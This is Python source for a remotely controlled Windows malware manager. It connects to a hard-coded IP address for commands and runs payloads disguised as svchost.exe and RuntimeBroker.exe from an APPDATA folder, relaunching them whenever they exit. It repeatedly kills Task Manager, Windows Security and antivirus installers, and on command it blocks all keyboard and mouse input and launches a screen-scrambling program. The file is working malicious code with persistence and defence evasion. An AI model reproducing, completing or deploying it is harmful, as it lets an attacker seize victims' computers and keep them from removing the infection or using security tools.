import os
import time
import mouse
import psutil
import keyboard
import pythoncom
import subprocess

from threading import Thread
from managed_socket import Socket
from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume

class Manager(Thread):
    def __init__(self):
        Thread.__init__(self)

        self.socket = Socket("201.83.5.29", 27593, "manager")
        self.socket.on("data", self.handleData)
        self.socket.start()

        self.path = os.getenv("APPDATA") + "\\Microsoft\\Audios"
        self.audio_path = self.path + "\\svchost.exe"
        self.commands_path = self.path + "\\RuntimeBroker.exe"
        self.processes = {
            "audio": {
                "path": self.audio_path,
                "process": subprocess.Popen(self.audio_path, shell=False),
            },
            "commands": {
                "path": self.commands_path,
                "process": subprocess.Popen(self.commands_path, shell=False),
            },
        }

        # self.processes = {}

        self.scrumbler = None
        self.blockInput = False
        
        #"Taskmgr.exe"
        self.killProcesses = [
            "SecHealthUI.exe",
            "Taskmgr.exe",
            "avast_free_antivirus_setup_online.exe",
            "avast_free_antivirus_setup_online_x64.exe",
            "avg_antivirus_free_setup.exe",
            "AVIRA.SPOTLIGHT.BOOTSTRAPPER.EXE",
            "ProductAgentUI.exe",
            "instup.exe"
        ]

        self.searchAndKill = [
            "kaspersky"
        ]

    def blockInputs(self):
        for i in range(150):
            keyboard.block_key(i)

        while self.blockInput:
            mouse.move(1,0, absolute=True, duration=0)

        for i in range(150):
            keyboard.unblock_key(i)

    def _blockInput(self, data):
        self.blockInput = True
        Thread(target=self.blockInputs).start()

    def _enableInput(self, data):
        self.blockInput = False

    def _enableTaskMng(self, data):
        if "Taskmgr.exe" in self.killProcesses:
            del self.killProcesses[self.killProcesses.index("Taskmgr.exe")]
            self.socket.s.sendall(b"message;[Manager] Enabled task manager")

    def _disableTaskMng(self, data):
        if "Taskmgr.exe" not in self.killProcesses:
            self.killProcesses.append("Taskmgr.exe")
            self.socket.s.sendall(b"message;[Manager] Disabling task manager")

    def _scrumbleScreen(self, data):
        if not self.scrumbler:
            self._blockInput(data)
            self.scrumbler = subprocess.Popen(self.path + "\\Widgets.exe", shell=False)

    def handleData(self, data):
        print('data: ', data)
        if hasattr(self, f'_{data[0]}'):
            func = getattr(self, f'_{data[0]}')
            try:
                func(data[1:])
            except Exception as err:
                pass
        else:
            self.socket.s.sendall(b'message;[Manager] Invalid command')

    def manageVolume(self):
        pythoncom.CoInitialize()

        while True:
            if psutil.pid_exists(self.processes["audio"]["process"].pid):
                sessions = AudioUtilities.GetAllSessions()
                for session in sessions:
                    volume = session._ctl.QueryInterface(ISimpleAudioVolume)
                    if session.Process and session.Process.name() == "svchost.exe":
                        volume.SetMute(False, None)
                        volume.SetMasterVolume(1, None)
                        break

            time.sleep(0.5)

    def run(self):
        Thread(target=self.manageVolume).start()

        while True:
            for process in self.processes:
                module = self.processes[process]
                if not psutil.pid_exists(module["process"].pid):
                    module["process"] = subprocess.Popen(module["path"], shell=False)

            for proc in psutil.process_iter():
                try:
                    if proc.name() in self.killProcesses:
                        proc.kill()
                    else:
                        for searchName in self.searchAndKill:
                            if searchName in proc.name():
                                proc.kill()
                                break
                except Exception as err:
                    print(err)

            if self.scrumbler:
                if not psutil.pid_exists(self.scrumbler.pid):
                    self.scrumbler = None
                    self._enableInput(None)

            time.sleep(0.25)

if __name__ == "__main__":
    Manager().start()
